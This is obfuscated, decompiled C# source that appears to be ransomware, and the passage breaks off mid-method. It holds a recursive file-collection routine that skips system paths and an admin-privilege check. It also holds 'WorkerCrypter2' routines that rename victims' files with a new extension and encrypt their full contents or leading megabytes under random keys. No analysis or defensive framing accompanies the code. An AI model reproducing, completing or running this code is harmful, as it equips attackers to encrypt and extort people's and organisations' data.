using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using dtpbuiRpMAdwEL;

namespace bpbWYHKNCNX;

internal sealed class xWcMxnuhDQYJl
{
	public sealed class tBfiviphBCfPXk
	{
		private static StringCollection jvBEqfepONzz;

		private static List<string> yrWUgMDKQJMjC;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107407078));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107407041)) && !text.ToLower().Contains(getString_0(107407052)) && !text.ToLower().Contains(getString_0(107393059)) && !text.ToLower().Contains(getString_0(107393046)) && !text.ToLower().Contains(getString_0(107407007)) && !text.ToLower().Contains(getString_0(107392898)) && !text.ToLower().Contains(getString_0(107392359)) && !text.ToLower().Contains(getString_0(107392310)) && !text.ToLower().Contains(getString_0(107392325)) && !text.ToLower().Contains(getString_0(107392276)) && !text.ToLower().Contains(getString_0(107392274)) && !text.ToLower().Contains(getString_0(107392225)) && !text.ToLower().Contains(getString_0(107392240)) && !text.ToLower().Contains(getString_0(107392195)) && !text.ToLower().Contains(getString_0(107392206)) && !text.ToLower().Contains(getString_0(107392161)) && !text.ToLower().Contains(getString_0(107392148)) && !text.ToLower().Contains(getString_0(107392131)) && !text.ToLower().Contains(getString_0(107392146)) && !text.Contains(QqgSuZNWThrmn(getString_0(107392609))) && !text.Contains(getString_0(107392616)) && !text.Contains(getString_0(107392571)) && !text.EndsWith(getString_0(107395958)) && !text.EndsWith(getString_0(107392586)) && !text.EndsWith(getString_0(107392581)) && !text.EndsWith(getString_0(107392544)) && !text.EndsWith(getString_0(107392539)) && !text.ToLower().Contains(getString_0(107392534)) && !text.ToLower().Contains(KjHXSeuruGpT))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(MOwNEeKCkWc) * 1024.0 * 1024.0 && PRunLMYBEymXvZ == getString_0(107396801))
							{
								yrWUgMDKQJMjC.Add(text);
							}
							else if (File.Exists(text) && PRunLMYBEymXvZ == getString_0(107397058))
							{
								yrWUgMDKQJMjC.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return yrWUgMDKQJMjC;
		}

		static tBfiviphBCfPXk()
		{
			Strings.CreateGetStringDelegate(typeof(tBfiviphBCfPXk));
			jvBEqfepONzz = new StringCollection();
			yrWUgMDKQJMjC = new List<string>();
		}
	}

	private sealed class hxFeLXKKdg
	{
		public string batkyOkXfMk;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == batkyOkXfMk;
		}
	}

	private sealed class LJzaYuCmVDq
	{
		public string ZRXxGWSHYXQWp;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CMapDrv_003Eb__18(int int_0)
		{
			Thread.Sleep(QMoSPhxUXPCw);
			tHRBvePvZt.Add(getString_0(107392499) + ZRXxGWSHYXQWp + getString_0(107397238) + (char)int_0 + getString_0(107407025));
			try
			{
				if (DolWpTQIcvjTgATJ)
				{
					Console.WriteLine(getString_0(107392499) + ZRXxGWSHYXQWp + getString_0(107397238) + (char)int_0 + getString_0(107407025));
				}
			}
			catch
			{
			}
		}

		static LJzaYuCmVDq()
		{
			Strings.CreateGetStringDelegate(typeof(LJzaYuCmVDq));
		}
	}

	private sealed class jEtbiKyHfA
	{
		private sealed class rGFvoRPmTAGv
		{
			public jEtbiKyHfA UrQhEdizfN;

			public string myjcSDZZeNX;

			public void _003CCrypt_003Eb__24()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					IOttHDtrCjGUm(WindowsIdentity.GetCurrent().Name, myjcSDZZeNX);
				}
			}

			public void _003CCrypt_003Eb__25()
			{
				IsPUoYHanjhwp(myjcSDZZeNX, UrQhEdizfN.wyJzwLFxBwBOC, UrQhEdizfN.FOASbRAtLPbX, UrQhEdizfN.mDChvUlwdKJLJ, UrQhEdizfN.tvXDlrlmTaapy);
			}
		}

		public string[] wyJzwLFxBwBOC;

		public string[] mDChvUlwdKJLJ;

		public string tvXDlrlmTaapy;

		public string FOASbRAtLPbX;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__23(string string_0)
		{
			rGFvoRPmTAGv CS_0024_003C_003E8__locals0 = new rGFvoRPmTAGv();
			CS_0024_003C_003E8__locals0.UrQhEdizfN = this;
			CS_0024_003C_003E8__locals0.myjcSDZZeNX = string_0;
			if (xYpnNhEseitt && !kdEHjiIxPH().Contains(getString_0(107390338)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						IOttHDtrCjGUm(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.myjcSDZZeNX);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (HRBtCVbsJzEiv == getString_0(107396809))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					IsPUoYHanjhwp(CS_0024_003C_003E8__locals0.myjcSDZZeNX, CS_0024_003C_003E8__locals0.UrQhEdizfN.wyJzwLFxBwBOC, CS_0024_003C_003E8__locals0.UrQhEdizfN.FOASbRAtLPbX, CS_0024_003C_003E8__locals0.UrQhEdizfN.mDChvUlwdKJLJ, CS_0024_003C_003E8__locals0.UrQhEdizfN.tvXDlrlmTaapy);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				IsPUoYHanjhwp(CS_0024_003C_003E8__locals0.myjcSDZZeNX, wyJzwLFxBwBOC, FOASbRAtLPbX, mDChvUlwdKJLJ, tvXDlrlmTaapy);
			}
		}

		static jEtbiKyHfA()
		{
			Strings.CreateGetStringDelegate(typeof(jEtbiKyHfA));
		}
	}

	private sealed class iathxhxZEnZYRxr
	{
		private sealed class UVREpotDXBDLSX
		{
			public iathxhxZEnZYRxr qoIwIxRXeCZoRFmks;

			public string IyMOKOotYjsS;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__31()
			{
				foreach (string item in sMhKmHJvtlNZhjZ)
				{
					if (IyMOKOotYjsS.ToLower().EndsWith(item + qoIwIxRXeCZoRFmks.oUtDEXanHATFjP) && nDWwTnbqwmod == getString_0(107396820))
					{
						if (Convert.ToInt32(yzFHxOjAMjqD) * 1024 * 1024 > new FileInfo(IyMOKOotYjsS).Length)
						{
							try
							{
								WvzKEuHaCmnRFN.TuLLWzXJhisVm(getString_0(107393559), getString_0(107393522), getString_0(107393541), IyMOKOotYjsS);
							}
							catch
							{
							}
						}
					}
					else if (IyMOKOotYjsS.ToLower().EndsWith(item) && nDWwTnbqwmod == getString_0(107397077))
					{
						try
						{
							WvzKEuHaCmnRFN.TuLLWzXJhisVm(getString_0(107393559), getString_0(107393522), getString_0(107393541), IyMOKOotYjsS);
						}
						catch
						{
						}
					}
				}
			}

			static UVREpotDXBDLSX()
			{
				Strings.CreateGetStringDelegate(typeof(UVREpotDXBDLSX));
			}
		}

		private sealed class VfXuPHCMuymp
		{
			public iathxhxZEnZYRxr qoIwIxRXeCZoRFmks;

			public string jpkNzOcKWPAoVWt;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__33()
			{
				foreach (string item in sMhKmHJvtlNZhjZ)
				{
					if (jpkNzOcKWPAoVWt.ToLower().EndsWith(item + qoIwIxRXeCZoRFmks.oUtDEXanHATFjP) && nDWwTnbqwmod == getString_0(107396823))
					{
						if (Convert.ToInt32(yzFHxOjAMjqD) * 1024 * 1024 > new FileInfo(jpkNzOcKWPAoVWt).Length)
						{
							try
							{
								WvzKEuHaCmnRFN.TuLLWzXJhisVm(getString_0(107393562), getString_0(107393525), getString_0(107393544), jpkNzOcKWPAoVWt);
							}
							catch
							{
							}
						}
					}
					else if (jpkNzOcKWPAoVWt.ToLower().EndsWith(item) && nDWwTnbqwmod == getString_0(107397080))
					{
						try
						{
							WvzKEuHaCmnRFN.TuLLWzXJhisVm(getString_0(107393562), getString_0(107393525), getString_0(107393544), jpkNzOcKWPAoVWt);
						}
						catch
						{
						}
					}
				}
			}

			static VfXuPHCMuymp()
			{
				Strings.CreateGetStringDelegate(typeof(VfXuPHCMuymp));
			}
		}

		public List<string> LShaCPUCJfEf;

		public List<string> maqAcdxAuaVA;

		public string oUtDEXanHATFjP;

		public string[] lfllMCihWCs;

		public string CmjdIJNPEyJFWZ;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__30(string string_0)
		{
			UVREpotDXBDLSX CS_0024_003C_003E8__locals0;
			foreach (string item in maqAcdxAuaVA)
			{
				if (lfllMCihWCs.Length != 0)
				{
					string[] array = lfllMCihWCs;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_094b;
					}
				}
				try
				{
					if (item.EndsWith(oUtDEXanHATFjP))
					{
						goto IL_094b;
					}
				}
				catch (Exception)
				{
					goto IL_094b;
				}
				if (!item.EndsWith(string_0) || dfsgzoHLEAZnW.Contains(item))
				{
					continue;
				}
				if (iFejgjdImWjFLfEJ == getString_0(107396817))
				{
					try
					{
						if (JHjCFdacWDCwN.kXAYfEbwZpl(item))
						{
							JHjCFdacWDCwN.uJhjcXrkFlLBC(item);
						}
					}
					catch
					{
					}
				}
				dfsgzoHLEAZnW.Add(item);
				if (!wwtCrdNFpS.Contains(Path.GetDirectoryName(item)))
				{
					wwtCrdNFpS.Add(Path.GetDirectoryName(item));
				}
				RWmueCtbpjJAa(item);
				try
				{
					new iyWSnjnabYn().XvqXWKXAtrbuzV(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (DolWpTQIcvjTgATJ)
							{
								Console.WriteLine(getString_0(107407033) + item + getString_0(107407468) + new FileInfo(item).Length + getString_0(107407479));
								Console.WriteLine(getString_0(107407438));
							}
						}
						catch
						{
						}
						EYyCcfVgmmBPY(QqgSuZNWThrmn(getString_0(107407333)), getString_0(107392466) + item + getString_0(107392466) + QqgSuZNWThrmn(getString_0(107407308)) + getString_0(107392466) + Environment.UserName + getString_0(107392466) + QqgSuZNWThrmn(getString_0(107407323)));
					}
				}
				catch (Exception ex2)
				{
					if (fvDSfFEVAaG)
					{
						try
						{
							File.AppendAllText(qiQAhhXEbdwvY, getString_0(107390480) + item + getString_0(107407298) + ex2.Message + getString_0(107396347));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (fvDSfFEVAaG)
						{
							try
							{
								File.AppendAllText(qiQAhhXEbdwvY, getString_0(107390480) + item + getString_0(107406673) + ex4.Message + getString_0(107396347));
							}
							catch (Exception)
							{
							}
						}
						bPwGjuPFVSkSv++;
						goto end_IL_02cd;
					}
					if (TNpgrHCAoXmhjxRU == getString_0(107396817) && new FileInfo(item).Length > Convert.ToInt32(qpeehHsICuPA) * 1024 * 1024 && !LShaCPUCJfEf.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new UVREpotDXBDLSX();
						CS_0024_003C_003E8__locals0.qoIwIxRXeCZoRFmks = this;
						try
						{
							if (oUtDEXanHATFjP != getString_0(107389748))
							{
								if (mNTCrJeXlKdoL)
								{
									oUtDEXanHATFjP = bKhumNWWxHrd + oUtDEXanHATFjP;
								}
								File.Move(item, item + oUtDEXanHATFjP);
							}
						}
						catch (Exception ex6)
						{
							if (fvDSfFEVAaG)
							{
								try
								{
									File.AppendAllText(qiQAhhXEbdwvY, getString_0(107390480) + item + getString_0(107406644) + ex6.Message + getString_0(107396347));
								}
								catch (Exception)
								{
								}
							}
							bPwGjuPFVSkSv++;
							goto end_IL_02cd;
						}
						CS_0024_003C_003E8__locals0.IyMOKOotYjsS = getString_0(107393475);
						if (oUtDEXanHATFjP != getString_0(107389748))
						{
							CS_0024_003C_003E8__locals0.IyMOKOotYjsS = item + oUtDEXanHATFjP;
						}
						else
						{
							CS_0024_003C_003E8__locals0.IyMOKOotYjsS = item;
						}
						if (UgGccBxJROB == getString_0(107396817))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in sMhKmHJvtlNZhjZ)
								{
									if (CS_0024_003C_003E8__locals0.IyMOKOotYjsS.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.qoIwIxRXeCZoRFmks.oUtDEXanHATFjP) && nDWwTnbqwmod == UVREpotDXBDLSX.getString_0(107396820))
									{
										if (Convert.ToInt32(yzFHxOjAMjqD) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.IyMOKOotYjsS).Length)
										{
											try
											{
												WvzKEuHaCmnRFN.TuLLWzXJhisVm(UVREpotDXBDLSX.getString_0(107393559), UVREpotDXBDLSX.getString_0(107393522), UVREpotDXBDLSX.getString_0(107393541), CS_0024_003C_003E8__locals0.IyMOKOotYjsS);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.IyMOKOotYjsS.ToLower().EndsWith(item2) && nDWwTnbqwmod == UVREpotDXBDLSX.getString_0(107397077))
									{
										try
										{
											WvzKEuHaCmnRFN.TuLLWzXJhisVm(UVREpotDXBDLSX.getString_0(107393559), UVREpotDXBDLSX.getString_0(107393522), UVREpotDXBDLSX.getString_0(107393541), CS_0024_003C_003E8__locals0.IyMOKOotYjsS);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = DPogULUxIgM.rxoNTzmfopSMb(32);
						string s = qQVKYmLneEhR.HpWrTpHQoP(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = UcPQEhwbPwt.RfngZyLuPZaRn(CS_0024_003C_003E8__locals0.IyMOKOotYjsS, Convert.ToInt32(qpeehHsICuPA) * 1024 * 1024);
						if (!UcPQEhwbPwt.vTfgqKCmDAm(VilQxGdSKPVC: (!lfeuQUnLLY) ? (ikJhDajEXzE ? UcPQEhwbPwt.PeZryOJEgIE(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : UcPQEhwbPwt.PeZryOJEgIE(byte_, Encoding.ASCII.GetBytes(CmjdIJNPEyJFWZ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (ikJhDajEXzE ? xbGQBBqWkqFa.VdtXEqVzDruYfP(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : xbGQBBqWkqFa.VdtXEqVzDruYfP(byte_, Encoding.ASCII.GetBytes(CmjdIJNPEyJFWZ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), GnufvwgpIEeUa: CS_0024_003C_003E8__locals0.IyMOKOotYjsS, BbSyJXSIaCTuyKp: bytes))
						{
							try
							{
								File.Move(item + oUtDEXanHATFjP, item);
							}
							catch (Exception)
							{
							}
							continue;
						}
						goto IL_094b;
					}
					if (mNTCrJeXlKdoL)
					{
						oUtDEXanHATFjP = bKhumNWWxHrd + oUtDEXanHATFjP;
					}
					string text2 = DPogULUxIgM.rxoNTzmfopSMb(32);
					string s2 = qQVKYmLneEhR.HpWrTpHQoP(text2);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (oUtDEXanHATFjP != getString_0(107389748))
					{
						if (!XSErQnXGRX)
						{
							if (!ikJhDajEXzE)
							{
								RWkakVMvZzWyf(item, item + oUtDEXanHATFjP, wYUomwviRA);
							}
							else
							{
								RWkakVMvZzWyf(item, item + oUtDEXanHATFjP, Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!ikJhDajEXzE)
								{
									KTFeWSRIhASFlx(item, item + oUtDEXanHATFjP, wYUomwviRA);
								}
								else
								{
									KTFeWSRIhASFlx(item, item + oUtDEXanHATFjP, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex9)
							{
								if (fvDSfFEVAaG)
								{
									try
									{
										File.AppendAllText(qiQAhhXEbdwvY, getString_0(107390480) + item + getString_0(107389702) + ex9.Message + getString_0(107396347));
									}
									catch (Exception)
									{
									}
								}
								bPwGjuPFVSkSv++;
								try
								{
									File.Move(item + oUtDEXanHATFjP, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_02cd;
							}
						}
					}
					else if (!XSErQnXGRX)
					{
						if (!ikJhDajEXzE)
						{
							RWkakVMvZzWyf(item, item + getString_0(107389711), wYUomwviRA);
						}
						else
						{
							RWkakVMvZzWyf(item, item + getString_0(107389711), Encoding.ASCII.GetBytes(text2));
						}
					}
					else
					{
						try
						{
							if (!ikJhDajEXzE)
							{
								KTFeWSRIhASFlx(item, item, wYUomwviRA);
							}
							else
							{
								KTFeWSRIhASFlx(item, item, Encoding.ASCII.GetBytes(text2));
							}
						}
						catch (Exception ex12)
						{
							if (fvDSfFEVAaG)
							{
								try
								{
									File.AppendAllText(qiQAhhXEbdwvY, getString_0(107390480) + item + getString_0(107389702) + ex12.Message + getString_0(107396347));
								}
								catch (Exception)
								{
								}
							}
							bPwGjuPFVSkSv++;
							goto end_IL_02cd;
						}
					}
					if (ikJhDajEXzE)
					{
						if (oUtDEXanHATFjP != getString_0(107389748))
						{
							OUVgqzYMvbARRN(item + oUtDEXanHATFjP, bytes2);
						}
						else
						{
							OUVgqzYMvbARRN(item, bytes2);
						}
					}
					goto IL_094b;
					end_IL_02cd:;
				}
				catch (Exception)
				{
					goto IL_094b;
				}
				continue;
				IL_094b:
				maqAcdxAuaVA.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__32(string string_0)
		{
			VfXuPHCMuymp CS_0024_003C_003E8__locals0 = new VfXuPHCMuymp();
			CS_0024_003C_003E8__locals0.qoIwIxRXeCZoRFmks = this;
			CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt = string_0;
			if (lfllMCihWCs.Length != 0)
			{
				string[] array = lfllMCihWCs;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0a13;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt.EndsWith(oUtDEXanHATFjP))
				{
					goto IL_0a13;
				}
			}
			catch (Exception)
			{
				goto IL_0a13;
			}
			if (!dfsgzoHLEAZnW.Contains(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt))
			{
				if (iFejgjdImWjFLfEJ == getString_0(107396817))
				{
					try
					{
						if (JHjCFdacWDCwN.kXAYfEbwZpl(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt))
						{
							JHjCFdacWDCwN.uJhjcXrkFlLBC(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt);
						}
					}
					catch
					{
					}
				}
				dfsgzoHLEAZnW.Add(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt);
				if (!wwtCrdNFpS.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt)))
				{
					wwtCrdNFpS.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt));
				}
				RWmueCtbpjJAa(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt);
				try
				{
					new iyWSnjnabYn().XvqXWKXAtrbuzV(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (DolWpTQIcvjTgATJ)
							{
								Console.WriteLine(getString_0(107407033) + CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + getString_0(107407468) + new FileInfo(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt).Length + getString_0(107407479));
								Console.WriteLine(getString_0(107407438));
							}
						}
						catch
						{
						}
						EYyCcfVgmmBPY(QqgSuZNWThrmn(getString_0(107407333)), getString_0(107392466) + CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + getString_0(107392466) + QqgSuZNWThrmn(getString_0(107407308)) + getString_0(107392466) + Environment.UserName + getString_0(107392466) + QqgSuZNWThrmn(getString_0(107407323)));
					}
				}
				catch (Exception ex2)
				{
					if (fvDSfFEVAaG)
					{
						try
						{
							File.AppendAllText(qiQAhhXEbdwvY, getString_0(107390480) + CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + getString_0(107407298) + ex2.Message + getString_0(107396347));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt).Length != 0L)
						{
							goto end_IL_031d;
						}
						goto end_IL_031d_2;
						end_IL_031d:;
					}
					catch (Exception ex4)
					{
						if (fvDSfFEVAaG)
						{
							try
							{
								File.AppendAllText(qiQAhhXEbdwvY, getString_0(107390480) + CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + getString_0(107406673) + ex4.Message + getString_0(107396347));
							}
							catch (Exception)
							{
							}
						}
						bPwGjuPFVSkSv++;
						goto end_IL_031d_2;
					}
					if (TNpgrHCAoXmhjxRU == getString_0(107396817) && new FileInfo(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt).Length > Convert.ToInt32(qpeehHsICuPA) * 1024 * 1024)
					{
						try
						{
							if (oUtDEXanHATFjP != getString_0(107389748))
							{
								if (mNTCrJeXlKdoL)
								{
									oUtDEXanHATFjP = bKhumNWWxHrd + oUtDEXanHATFjP;
								}
								File.Move(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + oUtDEXanHATFjP);
							}
						}
						catch (Exception ex6)
						{
							if (fvDSfFEVAaG)
							{
								try
								{
									File.AppendAllText(qiQAhhXEbdwvY, getString_0(107390480) + CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + getString_0(107406644) + ex6.Message + getString_0(107396347));
								}
								catch (Exception)
								{
								}
							}
							bPwGjuPFVSkSv++;
							return;
						}
						if (oUtDEXanHATFjP != getString_0(107389748))
						{
							CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt += oUtDEXanHATFjP;
						}
						if (UgGccBxJROB == getString_0(107396817))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in sMhKmHJvtlNZhjZ)
								{
									if (CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.qoIwIxRXeCZoRFmks.oUtDEXanHATFjP) && nDWwTnbqwmod == VfXuPHCMuymp.getString_0(107396823))
									{
										if (Convert.ToInt32(yzFHxOjAMjqD) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt).Length)
										{
											try
											{
												WvzKEuHaCmnRFN.TuLLWzXJhisVm(VfXuPHCMuymp.getString_0(107393562), VfXuPHCMuymp.getString_0(107393525), VfXuPHCMuymp.getString_0(107393544), CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt.ToLower().EndsWith(item) && nDWwTnbqwmod == VfXuPHCMuymp.getString_0(107397080))
									{
										try
										{
											WvzKEuHaCmnRFN.TuLLWzXJhisVm(VfXuPHCMuymp.getString_0(107393562), VfXuPHCMuymp.getString_0(107393525), VfXuPHCMuymp.getString_0(107393544), CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = DPogULUxIgM.rxoNTzmfopSMb(32);
						string s = qQVKYmLneEhR.HpWrTpHQoP(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = UcPQEhwbPwt.RfngZyLuPZaRn(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, Convert.ToInt32(qpeehHsICuPA) * 1024 * 1024);
						if (!UcPQEhwbPwt.vTfgqKCmDAm(VilQxGdSKPVC: (!lfeuQUnLLY) ? (ikJhDajEXzE ? UcPQEhwbPwt.PeZryOJEgIE(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : UcPQEhwbPwt.PeZryOJEgIE(byte_, Encoding.ASCII.GetBytes(CmjdIJNPEyJFWZ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (ikJhDajEXzE ? xbGQBBqWkqFa.VdtXEqVzDruYfP(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : xbGQBBqWkqFa.VdtXEqVzDruYfP(byte_, Encoding.ASCII.GetBytes(CmjdIJNPEyJFWZ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), GnufvwgpIEeUa: CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, BbSyJXSIaCTuyKp: bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + oUtDEXanHATFjP, CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (mNTCrJeXlKdoL)
						{
							oUtDEXanHATFjP = bKhumNWWxHrd + oUtDEXanHATFjP;
						}
						string text2 = DPogULUxIgM.rxoNTzmfopSMb(32);
						string s2 = qQVKYmLneEhR.HpWrTpHQoP(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (oUtDEXanHATFjP != getString_0(107389748))
						{
							if (!XSErQnXGRX)
							{
								if (!ikJhDajEXzE)
								{
									RWkakVMvZzWyf(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + oUtDEXanHATFjP, wYUomwviRA);
								}
								else
								{
									RWkakVMvZzWyf(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + oUtDEXanHATFjP, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!ikJhDajEXzE)
									{
										KTFeWSRIhASFlx(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + oUtDEXanHATFjP, wYUomwviRA);
									}
									else
									{
										KTFeWSRIhASFlx(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + oUtDEXanHATFjP, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex9)
								{
									if (fvDSfFEVAaG)
									{
										try
										{
											File.AppendAllText(qiQAhhXEbdwvY, getString_0(107390480) + CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + getString_0(107389702) + ex9.Message + getString_0(107396347));
										}
										catch (Exception)
										{
										}
									}
									bPwGjuPFVSkSv++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + oUtDEXanHATFjP, CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!XSErQnXGRX)
						{
							if (!ikJhDajEXzE)
							{
								RWkakVMvZzWyf(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + getString_0(107389711), wYUomwviRA);
							}
							else
							{
								RWkakVMvZzWyf(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt + getString_0(107389711), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!ikJhDajEXzE)
								{
									KTFeWSRIhASFlx(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, wYUomwviRA);
								}
								else
								{
									KTFeWSRIhASFlx(CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, CS_0024_003C_003E8__locals0.jpkNzOcKWPAoVWt, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex12)
							{
								if (fvDSfFEVAaG)
